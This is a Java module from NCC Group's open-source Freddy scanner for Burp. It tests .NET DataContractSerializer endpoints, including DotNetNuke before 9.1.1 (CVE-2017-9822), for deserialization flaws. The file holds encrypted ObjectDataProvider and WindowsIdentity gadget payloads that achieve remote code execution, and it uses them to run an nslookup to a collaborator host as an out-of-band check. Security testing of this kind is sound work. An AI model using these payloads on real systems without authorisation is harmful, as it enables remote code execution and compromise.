// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET DataContractSerializer API.
 *
 * Exploitation relies on control of a type parameter
 * specifying the type of the object to be deserialized.
 * DotNetNuke prior to 9.1.1 wrapped data serialized by
 * this API in an XML element that specifies the type
 * making it directly exploitable using the wrapped
 * payloads included in this module.
 *
 * Non-wrapped payloads are also included for cases where
 * the type is controlled, in which case the type needs to
 * be set as follows:
 *  For ObjectDataProvider payloads:
 *   -> System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 *  For WindowsIdentity payloads
 *   -> System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class DataContractSerializerModule extends FreddyModuleBase {
    //Wrapped payload names
    private static final String PN_OBJDATPRO_WRAPPED = PN_OBJDATPRO + "_Wrapped";
    private static final String PN_WINID_WRAPPED = PN_WINID + "_Wrapped";

    //Exception pattern (required to avoid false positives with NetDataContractSerializer and JsonDataContractSerializer)
    private static final Pattern PAT_EXCEPTION = Pattern.compile("[^tn]DataContractSerializer\\.InternalReadObject", Pattern.CASE_INSENSITIVE);

    //ObjectDataProvider payload data
    private final String OBJD_PREFIX = decrypt("21ECI++gRLWho4/vDf63W5IuJ9/Twk8Ei5rPA4ynHKRuMFqQCm5zQwua38OEAZPYMB6E6BFlvrrHYik58wssjVmRjW36A2kRhb/MIG/aqD2TQPbQhpdJzr4C5ByHk3VMUYtIZ9oSHO0ezBXs9JWg7SCNduVUBz0rKqQgYC1ULCvGSDrmmO89V3BZiGlFXCGy5IUJ0SpJgpnZeLlZ1lS9xHG+BaZ1kNwMe+S/zh0itZCi1hyWfzzjxLcLRkfsSLXCyl1CBZQBGj5aLsEwnkAIHcKupCX51wBEzd8TE8KxyWJ1UBV4Rtg++Zo0rKN7vM1HCul49gHkYF3gaNDLnSh7BBepXtPLBnilPgyNNsfMTpwdDYheaqsYEa+obvbn0xg7NlOekMHvfjm6Utd4dj5dm4/K4MS1pGM/XITtbj/qJ1LI0Da+l7aFDuVuk5juWMk48+IVyxsFGm3+qtClASOoNinY5rtchbSyDmLIpdWPGgAqdj9++pgp2GGxfJDlB7LhETbC5SvXp3m3dKjfErfbrh3zHlTkfTEggSGHQGAOfGyLJ2OUQOyYmTWOC6NnacnLGuweteVtjhMmF1P1XYeN3BgMBjyP7GRd2UnIOuTgl1QBEXA87SxxKHRHxugjNENzsryKQ0ZFWm0skZmDCgkgkB3zHlTkfTEggSGHQGAOfGyLJ2OUQOyYmTWOC6NnacnLL6vhGuLKldaL4ktJHF3L+aqSTvcAu08F8k7XCURulG9EX7BoqsFXcZozN8guXM8ASxjGFB+dgIZxvFIXMtdBeReTyjXNVsE9xK2BHyQa7212JwLrui+J/HTKJvPcqQ2oM//urkLrXGBd+fCHbgN10jFykBsqllbcWZSgd0+5ZAOQNMmbfatF1zKRXfvWbD/XbSjLc1W4lOIi543BEAOyy34i/ouZKA8NeN/zYww4y+gqURVqgh/LrubqhmKB7audEVWafTJoLpj7QEa3pnX6+2xynSqWssIrwMkBUrJ3Krd7/k7VOArm8+GojAdXfC5sqxQnvjKLl3f5P4bh1Df30qLiqOaIVC2J9Qsb+tMUMen6vFuVBCzUcBgzX1wO1BLrjFnZpdJ9Ey88ByrGUW1xi5EPR0FKN/i29hSG4rggQVg=");
    private final String OBJD_SUFFIX = decrypt("EVHyOtHJw9lKeY/tvgWOgJSITltOOHE2kOtHbv3uGOQVyZ2yWGBPczimJ4KdrYHpWpK2vAHWxQGvrYpcybbnRiYIHFBKFLsLiT2JyimGD0a65V1d/5z2d4dsL17FqaEZqYQ7Ek9yUTq9fpTr79GJdZzRgEV/5h/wWTIwXa62dCCIl8gHsdw8jkBvw7A7vmcL");
    private final String OBJDW_PREFIX = decrypt("21ECI++gRLWho4/vDf63Wy+0GBy47O+UFKdUKs35ffLUJUGY21Fj18w/IlQ6rq+AeIMhLvY7wDNoR/3x4OB2mfYICKYZjDkwKVoKU8shkbvJLYKQ53RH06m1PDL07V6lzNmSdHGfDtEqErQcrFLDmiaHfoMC1e3KcbziDzOOAExSffAyJV8IVGcbonu5vIwc4D2n4j28QVl+NdGzjPqrCaDYscwB6KLa8McUpAs40+K2soL5l/gIN+1HQe5Hewu8Sv0mZGvqY+YH2PS15ZaSB32lIJzCZ9ecfteIqd2JjNeSq4vEeRaA+rh+emdLeTLnCm6t5Nsy5LmYF8haDbuo9sApYyzwnp0T/7hQgBJds0Kw8SFBIXCO1X+Xw1hnVLLVS1j3uNwZylcL9NsgRJQ+gIa+XSw7mXXM3EY7nkj3QN69zmN1Sy1y+ttuaDovaunEWkAPTcWkDnQ3TMnftoXiTn73x0fE9beGKnREaNlnGWZy05l9qaJiUucY3R+wL/BhvCmmd5wApgCQRQ7fEfqPQKkmDlfVT+Y00SlnHQM2qx/gYF5NdAFtgkCKMcnM3dr46MSTZ15Wk79lcKYGkz+13IHMIuznr8UiBe7TnIYtfJ4JfLE3kP8HxR8NeRRfVYqkofMGe6aOxU5AewC7ioEi47Ne9lgY7GO9M0Zn34g1V1oCWZcDeXCvLh95LHjSfoLTEIDQAqZ92mcHEXhT0NZsCADRjQb29tKdHa+2lDXHMeicVL+bPneEGnkzruwE8e+eA8N+PQohA0CUIMDauD3km38MFjM8265Dzbif5d8ScTKcwFzTT1PccrRuEvhhAB2S6MpHdF1j3DeWTy4NF6vpIYfaOTPAq3IGpzvf+MyrJJ54gyEu9jvAM2hH/fHg4HaZ9ggIphmMOTApWgpTyyGRuzzEgmkNuqHpJBkTpRIvEkXXRlxmmRaIGM4Ji77B2MD/8togvWubYG1BXKha89aBAmzI9CDKwFN92BRPUdwZCo9HabK4R1tjhLkG4y4spb66P99RdMCFyTlEtCk1KsGE/ZRpJuhTmBgG0Ay1lDBnkUZoR5pGjDYtCvmuzWVs7fusqvFrk7ZbX523P5/nv7xCb43m7aRrcW/ezG5THqupQIzf9HTiUtpoiogNvyjVO6wAYscI97X9JJ3KQ0UBdAWn3ZNA9tCGl0nOvgLkHIeTdUxRi0hn2hIc7R7MFez0laDte9ewDMh2VDY7ujTYOuGmjso2C1NAa5hSFuBZBAxzx9xb+96aM2avZAMry4SmZ0PVHTUsSe/GZ9C6hnsp+E6kI5NA9tCGl0nOvgLkHIeTdUxRi0hn2hIc7R7MFez0laDtII125VQHPSsqpCBgLVQsK3ijzJ5TvqpPcUjAD8j8COr4XqHMak7Og+LG3m9+Hcp4Lcu+WFQcMmv1esoOYB2usrz582cEdndjjo0vcdp27fyhyVmlWqm3auEFTgG7xf0anStP4pNOh4PNAeY6d3kwWPIF5jzXXqEfXjXJLxcUD1NmbdqcaiX50gORI5gMopSccf6O4nOuDCgLqTUY3KkwMr/WvOZ+ux+8tQ8wciFsHayTKUyui31yk2eT+cPUiPlc8pihD2hhRlPGslkMXbRRHerm6JBADV/a18455A5s9Jzn9/8DqW1RFRxG25HYqYZ/+8TuZP1ii6pME3kScWeABJOWyQ1qgCREJoTw8UHSP29P5uZfd5k2fD/w88RSVSmu9pV7aHs9Dy+eQONuZo/n0r2TLZCyU+DsYb7pphCE4qE=");
    private final String OBJDW_SUFFIX = decrypt("EVHyOtHJw9lKeY/tvgWOgJSITltOOHE2kOtHbv3uGOQVyZ2yWGBPczimJ4KdrYHpWpK2vAHWxQGvrYpcybbnRiYIHFBKFLsLiT2JyimGD0a65V1d/5z2d4dsL17FqaEZqYQ7Ek9yUTq9fpTr79GJdZzRgEV/5h/wWTIwXa62dCAJFilhRDd+C1jCM4nqt8dNU+7TNntoj821rQWQsEtrvQ==");

    //WindowsIdentity payload data
    private final String WINID_PREFIX = decrypt("mFMZScDaO9LO4CxLifn2LD62eR2hZ1ZycQ3ktJTdahd4ScPKmf3KHsGA2SoExxUFjhXHckZo/ayvsBKPhxlXG9GQXmMD5LRwg2INu3mY/qbymKEPaGFGU8ayWQxdtFEdjH3lEnXG39R72+Jc5Ti4U1hgvRrRGM5R8bRUsLY4biPlD1HqZd92Cv7uX0p0AEzuwZCY6E2lY88HbPZgVw2US05Xpn9lpj5CRpmVjtBEhXhhT10gGnIptRt/qEDSwKyIsT/vQx3kwh2fcEDG2Zsas+l03H/9Y/Q6ZAuG+xgANwfDPCgQCSWLNtEOVRcST3k4NCwqUUDmdsKupiwr9uoR9cWNnlNCPDBLOFj/fUdhnAE=");
    private final String WINID_SUFFIX = decrypt("k8rIPZmaP46MfeI2BcNK46HFBAEe7/OPt7K6I0XHWQvJwnmoot4ah222RHlJsUyb+ulRZ6sfC/hVFHNndUwNNQmanDpyQZTNptIKnFGc0NE=");
    private final String WINIDW_PREFIX = decrypt("9hM9B46Z9AknUvsY0x8HiXG+BaZ1kNwMe+S/zh0itZCi1hyWfzzjxLcLRkfsSLXCyl1CBZQBGj5aLsEwnkAIHURVjiA6NQExESxkdfHab+5IQwjarOPrrUI4MrM2uX/vKSRFxWwIDhPmJfLBMCG4UU5Xpn9lpj5CRpmVjtBEhXhIibl8i7REtJoDcBiRQ6wJllUyreOdl7HS9Zr4FS1pS/OClBf7bJeqPDjzWWYy/WEncn4XTKw6Rkz/d/Z89ef+sNuQIviWiwRUw3rG0Q8buLY4BYhyyh9C9yeQOTx5u54OqAEQDly8lem7o3daCONFxuEeKvV7vMpQ8TCs3RsJs3G+BaZ1kNwMe+S/zh0itZCi1hyWfzzjxLcLRkfsSLXCyl1CBZQBGj5aLsEwnkAIHdF918Up1TscKz3ty9/9zFr2lXtoez0PL55A425mj+fS3Y1rafrbAj3hXL6Q56WgYpKIyZV+iRz23JFunLuzAWPoLZk7K+gHfyUMbmwrbMN/M41p/tpwowgXJQIh0wo0T5Y5AUt0fJdk+6T3l9crrzMGPQelRHc3ZUC7+7LCPX39ocUEAR7v84+3srojRcdZC8nCeaii3hqHbbZEeUmxTJvhrPVoBBzJamsD6z5HWIjZG+6y3/2qu1yfDUlMuJpCeg==");
    private final String WINIDW_SUFFIX = decrypt("k8rIPZmaP46MfeI2BcNK46HFBAEe7/OPt7K6I0XHWQvJwnmoot4ah222RHlJsUyb+ulRZ6sfC/hVFHNndUwNNT0N9g2q9dAOZSjdErK2LMU=");
    private final String WINID_INNER_PREFIX_B64 = decrypt("Ul2BJ8HvgV0B/ncnI0pRyS/YjE+RZtJ/Vd19d/LsCoA6HTuGNBTE6m06nVzlqHy4pulfRTFbV5BbmU0e2LDDuwou8mDPEBPld0UXa5TefSKdJ2/8Q2gV+D28cxf8kTLd/0g7VPRfIf3KnpR2HUCXWpEMfkockz4LYXLn/qrCyK0wF/17+5HjvbsTAvrvbjEGHZI0ywokUOXVWCd1/SnU3s4TdNk3Hwmx/UJaJQfE7qkJ7ynoo8q0uk7rc+yajdX89XW1dQjLb144TgrkU9hNfvxS4E/KXWJgbYdd3tkI1sOMJ26VgcJo5XbPIw8hAhnQwd1HFHACMfjwnI86FE1G2il9cBZ8+dkIz7H7Mmw/sqzlR0HMo2+O9rl6X/0swLSwwqkKcbldbNbXR+UaDO3czmqUYKyNXY1pwZE9fF4sWpBrMZ8NDNNWjoGJNOjSbJHLbDs1T2MrJzO1UDxwdcwoFuQkMjVSodMVMOGWwqew2WgFcctUCUwadHPsmkf1eotk5aXWBts0RAXncFXffUvfhD8X1132FwkF4DJDZ6f8FLFTK579wOunUex4fWUVdRulWdJg0xKIRVamWy08jGAiZXdZxYi3AZ9sAUM+3mMqaiG2gCgwNjs+ltHAF0R4zh0Mpr6wes/PqFjrRTsqz2j/44xh5LIwfIhnLBWttpIcf9oYn5bkuc7/zP2Pou5DIkDLBm5b2eDscuejqwBQ8hp9XNj5wkPoMCo/Jfq6NtQ2kRjNfjhayP0o5227S75/bwpupUcQPmBHg/GLoU6QXqDSKUUIXIoXSSZ2C9bVfM7iH0OqAxFAPGun9+4t5u0AfQH3+ItVIaHVw2YfBEpH4mON2rb9Bd8JvPNsoxBZ0KalVHmFNIRUv0kd/hrzIVAnCgkO50vYTXMUKG1Yc8/zbV9yMwHLi243Kswn7CkrBCI6YGeOJuwE3iOneC2J4M6jaTkFyi8HFiwYA6+/FQwW+ZM3zSi+8xm2ohHdHnF2doLF/rxR80aKjFnM1zI7yhnsGQOb7r0xkt1Ztc055DoFlc1Vl67bqhMl6vNPbl1mSDx2D/kIO13MYmwAj3rv/4sluX5llr87fNZj4TnA0URwi4HkrStmT1ofXBbN7eBs9nWwU2VT4yFoCmQWdx1X0Gr/t59ZKf7eEOGMstqNZCLNIWER2n4Qlp5ST0JMBG4y/qlsl/Y=");
    private final String WINID_INNER_SUFFIX_B64 = decrypt("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");
    private static final int WINID_PAYLOAD_CMD_OFFSET = 663;
    private byte[] WINID_INNER_PAYLOAD;

    protected void initialiseModule() {
        setName("DataContractSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on control of the type parameter to the " +
                "DataContractSerializer constructor. Versions of DotNetNuke prior to 9.1.1 wrap serialized " +
                "data in a root XML element that specifies the type, making them directly exploitable " +
                "(CVE-2017-9822).");
        setRemediationDetail("");
        setSeverity(SeverityRating.MEDIUM);

        registerPassiveScanIndicator(PAT_EXCEPTION, IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<test/>", PAT_EXCEPTION);

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
        registerActiveScanCollaboratorPayload(PN_OBJDATPRO_WRAPPED, false);
        registerActiveScanCollaboratorPayload(PN_WINID, false);
        registerActiveScanCollaboratorPayload(PN_WINID_WRAPPED, false);

        //Initialise the inner buffer for the Windows Identity payload
        WINID_INNER_PAYLOAD = buildBinaryPayloadBuffer(WINID_INNER_PREFIX_B64, WINID_INNER_SUFFIX_B64, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;

            case PN_OBJDATPRO_WRAPPED:
                return OBJDW_PREFIX + "nslookup " + hostname + OBJDW_SUFFIX;

            case PN_WINID:
                return WINID_PREFIX + generateBase64BinaryPayload(WINID_INNER_PAYLOAD, WINID_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false) + WINID_SUFFIX;

            case PN_WINID_WRAPPED:
                return WINIDW_PREFIX + generateBase64BinaryPayload(WINID_INNER_PAYLOAD, WINID_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, false) + WINIDW_SUFFIX;
        }
        return null;
    }
}
